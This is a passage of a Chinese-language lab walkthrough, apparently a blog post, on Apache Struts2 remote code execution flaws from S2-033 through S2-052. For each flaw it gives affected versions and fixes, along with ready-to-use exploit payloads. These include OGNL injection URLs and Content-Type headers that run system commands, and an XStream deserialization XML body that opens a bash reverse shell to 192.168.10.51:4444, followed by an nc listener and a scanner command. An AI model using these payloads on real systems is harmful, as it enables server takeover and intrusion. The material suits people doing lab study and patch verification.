+<p><img src="/images/Struts2/image-20210222095539045.png" alt="image-20210222095539045"></p>
+<p>2、payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.20.120:8080/S2-033/orders/4/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&amp;obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&amp;content=2908&amp;command=id</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210222095620558.png" alt="image-20210222095620558"></p>
+<h5 id="漏洞修复-22"><a href="#漏洞修复-22" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、禁用动态方法调用（DMI），修改Struts2的配置文件struts.xml，将struts.enable.DynamicMethodInvocation设置为“false”；</p>
+<p>2、目前官方已经推出了2.3.20.3、2.3.24.3和2.3.28.1修复这个问题，大家可以针对自己所使用的版本进行升级。</p>
+<h5 id="参考-22"><a href="#参考-22" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-033</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="CVE-2016-4438"><a href="#CVE-2016-4438" class="headerlink" title="CVE-2016-4438"></a>CVE-2016-4438</h4><p>S2-037</p>
+<h5 id="漏洞描述-23"><a href="#漏洞描述-23" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Apache Struts2在使用REST插件的情况下，攻击者使用REST调用恶意表达式可以远程执行代码。该漏洞编号为CVE-2016-4438，目前命名为S2-037。</p>
+<h5 id="影响范围-23"><a href="#影响范围-23" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.3.20 - Struts Struts 2.3.28.1</p>
+<h5 id="漏洞原理-23"><a href="#漏洞原理-23" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Apache Struts2在使用REST插件的情况下，攻击者使用REST调用恶意表达式可以远程执行代码。该漏洞编号为CVE-2016-4438，目前命名为S2-037。</p>
+<h5 id="漏洞条件-23"><a href="#漏洞条件-23" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.3.20 - Struts Struts 2.3.28.1</p>
+<h5 id="漏洞检测-23"><a href="#漏洞检测-23" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>0、环境</p>
+<p>docker环境实战复测</p>
+<p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.10.51:8080&#x2F;S2-037&#x2F;orders&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210222203209324.png" alt="image-20210222203209324"></p>
+<p>2、payload</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//192.168.10.51:8080/S2-037/orders/3/%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23process%3d%40java.lang.Runtime%40getRuntime().exec(%23parameters.command%5b0%5d)%2c%23ros%3d(%40org.apache.struts2.ServletActionContext%40getResponse().getOutputStream())%2c%40org.apache.commons.io.IOUtils%40copy(%23process.getInputStream()%2c%23ros)%2c%23ros.flush()%2c%23xx%3d123%2c%23xx.toString.json?command=ls%20/</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210222203143384.png" alt="image-20210222203143384"></p>
+<h5 id="漏洞修复-23"><a href="#漏洞修复-23" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Struts 2.5版本之后已修复</p>
+<h5 id="参考-23"><a href="#参考-23" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-037</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;weixin_39998158&#x2F;article&#x2F;details&#x2F;100539531</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2017-5638"><a href="#CVE-2017-5638" class="headerlink" title="CVE-2017-5638"></a>CVE-2017-5638</h4><p>S2-045</p>
+<h5 id="漏洞描述-24"><a href="#漏洞描述-24" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Struts2默认处理multipart上传报文的解析器为Jakarta插件（org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类）。<br>但是Jakarta插件在处理文件上传(multipart)的请求时会捉捕异常信息，并对异常信息进行OGNL表达式处理。当content-type错误时会抛出异常并带上Content-Type属性值，可通过构造附带OGNL表达的请求导致远程代码执行。</p>
+<h5 id="影响范围-24"><a href="#影响范围-24" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p>
+<h5 id="漏洞原理-24"><a href="#漏洞原理-24" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Struts2默认处理multipart上传报文的解析器为Jakarta插件（org.apache.struts2.dispatcher.multipart.JakartaMultiPartRequest类）。<br>但是Jakarta插件在处理文件上传(multipart)的请求时会捉捕异常信息，并对异常信息进行OGNL表达式处理。当content-type错误时会抛出异常并带上Content-Type属性值，可通过构造附带OGNL表达的请求导致远程代码执行。</p>
+<h5 id="漏洞条件-24"><a href="#漏洞条件-24" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p>
+<h5 id="漏洞检测-24"><a href="#漏洞检测-24" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、环境</p>
+<p>P牛的<a target="_blank" rel="noopener" href="https://github.com/vulhub/vulhub/tree/master/struts2/s2-045">docker</a>镜像</p>
+<p>2、访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.10.51:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224093000967.png" alt="image-20210224093000967"></p>
+<p>3、随机文章上传</p>
+<p><img src="/images/Struts2/image-20210224100226971.png" alt="image-20210224100226971"></p>
+<p>4、payload</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: %&#123;(#test=&quot;multipart/form-data&quot;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&quot;com.opensymphony.xwork2.ActionContext.container&quot;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println(100*100)).(#ros.flush())&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224100151940.png" alt="image-20210224100151940"></p>
+<h5 id="漏洞修复-24"><a href="#漏洞修复-24" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、升级到 Apache Struts 版本 2.5.13</p>
+<p>2、不使用时删除 Struts REST 插件，或仅限于服务器普通页面 和 JSONs： </p>
+<h5 id="参考-24"><a href="#参考-24" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-045</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2017-5638-1"><a href="#CVE-2017-5638-1" class="headerlink" title="CVE-2017-5638"></a>CVE-2017-5638</h4><p>S2-046 </p>
+<h5 id="漏洞描述-25"><a href="#漏洞描述-25" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>S2-046漏洞和S2-045漏洞相似，恶意攻击者精心构造Content-Type的值可能造成攻击；但有些限制条件。</p>
+<h5 id="影响范围-25"><a href="#影响范围-25" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.3.5 - Struts 2.3.31</p>
+<p>Struts 2.5 - Struts 2.5.10</p>
+<p>漏洞需要在strust.xml中加入 <code>&lt;constant name=&quot;struts.multipart.parser&quot; value=&quot;jakarta-stream&quot; /&gt;</code>才能触发。</p>
+<h5 id="漏洞原理-25"><a href="#漏洞原理-25" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>使用恶意的Content-Disposition值或者使用不合适的Content-Length头就可能导致远程命令执行。</p>
+<p>漏洞和S2-045漏洞类似。</p>
+<h5 id="漏洞条件-25"><a href="#漏洞条件-25" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10</p>
+<h5 id="漏洞检测-25"><a href="#漏洞检测-25" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.10.51:8080&#x2F;S2-046&#x2F;doUpload.action</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224110640381.png" alt="image-20210224110640381"></p>
+<p>2、请求截获数据包</p>
+<p><img src="/images/Struts2/image-20210224110713324.png" alt="image-20210224110713324"></p>
+<p>3、payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;#context[&#39;com.opensymphony.xwork2.dispatcher.HttpServletResponse&#39;].addHeader(&#39;X-Test&#39;,1+99)&#125;\x00b</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224111847794.png" alt="image-20210224111847794"></p>
+<p>4、修改字符<code>b</code>之前为00实现截断</p>
+<p><img src="/images/Struts2/image-20210224112013381.png" alt="image-20210224112013381"></p>
+<p><img src="/images/Struts2/image-20210224112040934.png" alt="image-20210224112040934"></p>
+<p>5、shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python struts-scan.py -u [200~http://192.168.10.51:8080/S2-046/ -i struts2-046</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224134605570.png" alt="image-20210224134605570"></p>
+<h5 id="漏洞修复-25"><a href="#漏洞修复-25" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>更新至以下版本或更新</p>
+<p>Struts 2.3.32 or Struts 2.5.10.1</p>
+<h5 id="参考-25"><a href="#参考-25" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-046</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2017-9791"><a href="#CVE-2017-9791" class="headerlink" title="CVE-2017-9791"></a>CVE-2017-9791</h4><p>S2-048 </p>
+<h5 id="漏洞描述-26"><a href="#漏洞描述-26" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>漏洞产生的原因是将用户可控的值添加到 ActionMessage 并在客户前端展示，导致其进入 getText 函数，最后 message 被当作 ognl 表达式执行所以访问 /integration/saveGangster.action；并构造payload检测。</p>
+<h5 id="影响范围-26"><a href="#影响范围-26" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.3.x with Struts 1 plugin and Struts 1 action</p>
+<h5 id="漏洞原理-26"><a href="#漏洞原理-26" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>漏洞产生的原因是将用户可控的值添加到 ActionMessage 并在客户前端展示，导致其进入 getText 函数，最后 message 被当作 ognl 表达式执行所以访问 /integration/saveGangster.action</p>
+<h5 id="漏洞条件-26"><a href="#漏洞条件-26" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.3.x </p>
+<p>开启Struts 1 plugin and Struts 1 action插件</p>
+<h5 id="漏洞检测-26"><a href="#漏洞检测-26" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.10.51:8080&#x2F;S2-048&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224140609780.png" alt="image-20210224140609780"></p>
+<p>2、构payload检测</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;1+2&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224140726364.png" alt="image-20210224140726364"></p>
+<p>3、获取系统信息</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%&#123;(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&#x27;com.opensymphony.xwork2.ActionContext.container&#x27;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#x27;whoami&#x27;).getInputStream())).(#q)&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224140843592.png" alt="image-20210224140843592"></p>
+<h5 id="漏洞修复-26"><a href="#漏洞修复-26" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1、不启用struts2-struts1-plugin插件</p>
+<p>2、更新至最新版本</p>
+<h5 id="参考-26"><a href="#参考-26" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-048</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_29647709&#x2F;article&#x2F;details&#x2F;84952381</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2017-9805"><a href="#CVE-2017-9805" class="headerlink" title="CVE-2017-9805"></a>CVE-2017-9805</h4><p>S2-052</p>
+<h5 id="漏洞描述-27"><a href="#漏洞描述-27" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。</p>
+<p>由于rest-plugin会根据URI扩展名或Content-Type来判断解析方法，所以我们只需要修改orders.xhtml为orders.xml或修改Content-Type头为application/xml，即可在Body中传递XML数据。</p>
+<h5 id="影响范围-27"><a href="#影响范围-27" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.1.6 - Struts 2.3.33</p>
+<p>Struts 2.5 - Struts 2.5.12</p>
+<h5 id="漏洞原理-27"><a href="#漏洞原理-27" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。</p>
+<p>由于rest-plugin会根据URI扩展名或Content-Type来判断解析方法，所以我们只需要修改orders.xhtml为orders.xml或修改Content-Type头为application/xml，即可在Body中传递XML数据。</p>
+<h5 id="漏洞条件-27"><a href="#漏洞条件-27" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.1.6 - Struts 2.3.33</p>
+<p>Struts 2.5 - Struts 2.5.12</p>
+<h5 id="漏洞检测-27"><a href="#漏洞检测-27" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.10.51:8080&#x2F;S2-052&#x2F;orders.xhtml</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224154729669.png" alt="image-20210224154729669"></p>
+<p>2、exp</p>
+<p>替换POST提交数据，同时修改<code>Content-Type</code>字段的value值：<code>application/xml</code></p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line">POST /S2-052/orders/3 HTTP/1.1</span><br><span class="line">Host: 192.168.10.51:8080</span><br><span class="line">Content-Length: 3246</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.10.51:8080</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4239.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://192.168.10.51:8080/S2-052/orders/3/edit</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: JSESSIONID=D6BA182C8D10856B226BBA6F7E3D5FA8; JSESSIONID=wftjcynnuu5i1ujnp3lwi370z</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">map</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">flags</span>&gt;</span>0<span class="tag">&lt;/<span class="name">flags</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">is</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.CipherInputStream&quot;</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">cipher</span> <span class="attr">class</span>=<span class="string">&quot;javax.crypto.NullCipher&quot;</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">initialized</span>&gt;</span>false<span class="tag">&lt;/<span class="name">initialized</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">opmode</span>&gt;</span>0<span class="tag">&lt;/<span class="name">opmode</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">serviceIterator</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.spi.FilterIterator&quot;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">iter</span> <span class="attr">class</span>=<span class="string">&quot;java.util.Collections$EmptyIterator&quot;</span> /&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">command</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                                <span class="tag">&lt;<span class="name">string</span>&gt;</span>bash -i <span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span> /dev/tcp/192.168.10.51/4444 0<span class="symbol">&amp;gt;</span><span class="symbol">&amp;amp;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;/<span class="name">command</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">redirectErrorStream</span>&gt;</span>false<span class="tag">&lt;/<span class="name">redirectErrorStream</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">next</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">iter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">filter</span> <span class="attr">class</span>=<span class="string">&quot;javax.imageio.ImageIO$ContainsFilter&quot;</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">method</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">class</span>&gt;</span>java.lang.ProcessBuilder<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">name</span>&gt;</span>start<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                            <span class="tag">&lt;<span class="name">parameter-types</span> /&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;/<span class="name">method</span>&gt;</span></span><br><span class="line">                                        <span class="tag">&lt;<span class="name">name</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">                                    <span class="tag">&lt;<span class="name">next</span> <span class="attr">class</span>=<span class="string">&quot;string&quot;</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">next</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;/<span class="name">serviceIterator</span>&gt;</span></span><br><span class="line">                                <span class="tag">&lt;<span class="name">lock</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;/<span class="name">cipher</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">input</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder$NullInputStream&quot;</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">ibuffer</span> /&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">done</span>&gt;</span>false<span class="tag">&lt;/<span class="name">done</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">ostart</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ostart</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">ofinish</span>&gt;</span>0<span class="tag">&lt;/<span class="name">ofinish</span>&gt;</span></span><br><span class="line">                            <span class="tag">&lt;<span class="name">closed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">closed</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">is</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">consumed</span>&gt;</span>false<span class="tag">&lt;/<span class="name">consumed</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">transferFlavors</span> /&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">dataHandler</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">dataLen</span>&gt;</span>0<span class="tag">&lt;/<span class="name">dataLen</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">jdk.nashorn.internal.objects.NativeString</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../jdk.nashorn.internal.objects.NativeString&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">entry</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdk.nashorn.internal.objects.NativeString</span> <span class="attr">reference</span>=<span class="string">&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">entry</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">map</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3、系统监听</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  struts-scan nc -lvnp 4444</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/Struts2/image-20210224155859544.png" alt="image-20210224155859544"></p>
+<h5 id="漏洞修复-27"><a href="#漏洞修复-27" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>Upgrade to Struts 2.5.13 or Struts 2.3.34</p>
+<h5 id="参考-27"><a href="#参考-27" class="headerlink" title="参考"></a>参考</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-052</span><br><span class="line">https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_29647709&#x2F;article&#x2F;details&#x2F;84954575</span><br></pre></td></tr></table></figure>
+
+<h4 id="CVE-2017-12611"><a href="#CVE-2017-12611" class="headerlink" title="CVE-2017-12611"></a>CVE-2017-12611</h4><p>S2-053</p>
+<h5 id="漏洞描述-28"><a href="#漏洞描述-28" class="headerlink" title="漏洞描述"></a>漏洞描述</h5><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
+<h5 id="影响范围-28"><a href="#影响范围-28" class="headerlink" title="影响范围"></a>影响范围</h5><p>Struts 2.1.6 - Struts 2.3.33</p>
+<p>Struts 2.5 - Struts 2.5.12</p>
+<h5 id="漏洞原理-28"><a href="#漏洞原理-28" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
+<h5 id="漏洞条件-28"><a href="#漏洞条件-28" class="headerlink" title="漏洞条件"></a>漏洞条件</h5><p>Struts 2.1.6 - Struts 2.3.33</p>
+<p>Struts 2.5 - Struts 2.5.12</p>
+<h5 id="漏洞检测-28"><a href="#漏洞检测-28" class="headerlink" title="漏洞检测"></a>漏洞检测</h5><p>1、URL访问</p>
